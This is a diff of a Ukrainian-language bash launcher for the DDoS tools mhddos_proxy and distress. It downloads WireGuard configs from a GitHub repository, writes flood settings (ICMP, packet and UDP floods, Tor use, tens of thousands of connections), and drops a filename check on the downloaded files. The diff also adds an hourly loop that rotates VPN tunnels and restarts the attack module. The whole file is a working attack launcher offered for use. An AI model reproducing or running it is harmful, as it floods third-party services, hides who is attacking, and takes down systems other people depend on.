@@ -2,8 +2,8 @@
 
 set -e
 
-#=== Підготовка середовища ===
-echo "[+] Перевірка та встановлення необхідних пакетів..."
+#=== Підготовка ===
+echo "[+] Перевірка і встановлення необхідних пакетів..."
 PKGS=(curl wget git screen sed)
 
 if command -v apt-get >/dev/null 2>&1; then
@@ -22,8 +22,8 @@ for pkg in "${PKGS[@]}"; do
     fi
 done
 
-#=== Створення папок ===
-echo "[+] Підготовка папок..."
+#=== Підготовка папок ===
+echo "[+] Підготовка структури папок..."
 MODULE_DIR="$HOME/modules"
 WG_DIR="$HOME/wg_confs"
 mkdir -p "$MODULE_DIR" "$WG_DIR"
@@ -32,15 +32,13 @@ SCRIPT_PATH="$(realpath "$0")"
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
 
-#=== Завантаження WG-конфігів ===
-echo "[+] Завантаження WG-конфігів..."
+#=== Завантаження WG конфігів ===
+echo "[+] Завантаження WG конфігів..."
 CONF_LIST=$(curl -s "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed 's|^/|https://github.com/|g' | sed 's|blob/|raw/|' | sed "s|https://github.com/k7771/Kaljan747/raw/k7771/wg/|$WG_RAW_BASE/|g" | grep -E '\.conf$')
 
 for url in $CONF_LIST; do
     file=$(basename "$url")
-    if [[ "$file" =~ ^[a-zA-Z0-9._-]+\.conf$ ]]; then
-        wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file"
-    fi
+    wget -qO "$WG_DIR/$file" "$url" && echo "[+] Завантажено: $file"
 done
 
 chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
@@ -52,12 +50,10 @@ INI2="$MODULE_DIR/distress.ini"
 
 if [ ! -f "$INI1" ]; then
   echo "--use-my-ip 0 --copies auto -t 8000" > "$INI1"
-  echo "[+] Створено mhddos.ini"
 fi
 
 if [ ! -f "$INI2" ]; then
   echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$INI2"
-  echo "[+] Створено distress.ini"
 fi
 
 #=== Завантаження модулів ===
@@ -67,29 +63,8 @@ echo "[+] Завантаження модулів..."
 
 chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"
 
-#=== Рандомний вибір WG-конфігів ===
-echo "[+] Випадковий вибір 4 WireGuard конфігів..."
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
-WG_IFACES=()
-
-if command -v wg-quick >/dev/null 2>&1; then
-    for conf in "${WG_FILES[@]}"; do
-        IFACE_NAME=$(basename "$conf" .conf)
-        if wg show "$IFACE_NAME" >/dev/null 2>&1; then
-            wg-quick down "$conf" && echo "[-] Перезапущено: $IFACE_NAME"
-        fi
-        if [ -f "$conf" ]; then
-            wg-quick up "$conf" && echo "[+] Підключено: $conf"
-            WG_IFACES+=("$IFACE_NAME")
-        fi
-    done
-else
-    echo "[-] wg-quick не знайдено. Пропускаємо тунелі."
-fi
-
 #=== Вибір модуля ===
 CONFIG_CHOICE_FILE="$HOME/last_module_choice.txt"
-INTERACTIVE=false
 
 if [[ ! -s "$CONFIG_CHOICE_FILE" ]]; then
     echo "[?] Виберіть модуль:"
@@ -97,7 +72,6 @@ if [[ ! -s "$CONFIG_CHOICE_FILE" ]]; then
     echo "2 - distress"
     read -p "[1/2]: " module_choice
     echo "$module_choice" > "$CONFIG_CHOICE_FILE"
-    INTERACTIVE=true
 else
     module_choice=$(cat "$CONFIG_CHOICE_FILE")
 fi
@@ -114,12 +88,11 @@ case $module_choice in
         MODULE_NAME="distress"
         ;;
     *)
-        echo "[-] Невірний вибір модуля"
+        echo "[-] Невірний вибір модуля."
         exit 1
         ;;
 esac
 
-#=== Параметри запуску модуля ===
 ARGS=$(cat "$CONFIG_FILE")
 
 #=== Вибір способу запуску ===
@@ -135,19 +108,38 @@ else
     run_mode=$(cat "$RUN_MODE_FILE")
 fi
 
-if [[ $run_mode == "1" ]]; then
-    screen -dmS "$MODULE_NAME" $MODULE $ARGS
-    echo "[+] $MODULE_NAME запущено у screen (фон)."
-elif [[ $run_mode == "2" ]]; then
-    echo "[+] Запуск $MODULE_NAME у screen..."
-    screen -S "$MODULE_NAME" $MODULE $ARGS
-elif [[ $run_mode == "3" ]]; then
-    echo "[+] Запуск $MODULE_NAME без screen у цьому терміналі..."
-    $MODULE $ARGS
-else
-    echo "[-] Невірний вибір запуску."
-    exit 1
-fi
+#=== Основний цикл перезапуску кожну годину ===
+while true; do
+    echo "[+] Зупинка модуля..."
+    pkill -f "$MODULE" 2>/dev/null || screen -S "$MODULE_NAME" -X quit 2>/dev/null || true
+    sleep 3
 
-#=== Завершення ===
-trap 'echo "[!] Скрипт зупинено вручну. Видаляємо last_module_choice.txt..."; rm -f "$CONFIG_CHOICE_FILE" "$RUN_MODE_FILE"; exit 0' INT
+    echo "[+] Вимкнення всіх WG інтерфейсів..."
+    ACTIVE_WG=$(wg show interfaces 2>/dev/null)
+    for iface in $ACTIVE_WG; do
+        wg-quick down "$iface" || true
+        sleep 1
+    done
+
+    echo "[+] Підключення нових WG конфігів..."
+    WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
+    WG_IFACES=()
+    for conf in "${WG_FILES[@]}"; do
+        IFACE_NAME=$(basename "$conf" .conf)
+        wg-quick up "$conf" && echo "[+] Підключено: $conf"
+        WG_IFACES+=("$IFACE_NAME")
+        sleep 1
+    done
+
+    echo "[+] Запуск модуля заново..."
+    if [[ $run_mode == "1" ]]; then
+        screen -dmS "$MODULE_NAME" $MODULE $ARGS
+    elif [[ $run_mode == "2" ]]; then
+        screen -S "$MODULE_NAME" $MODULE $ARGS
+    elif [[ $run_mode == "3" ]]; then
+        $MODULE $ARGS
+    fi
+
+    echo "[+] Очікування 59 хвилин перед наступним перезапуском..."
+    sleep 3540
+done
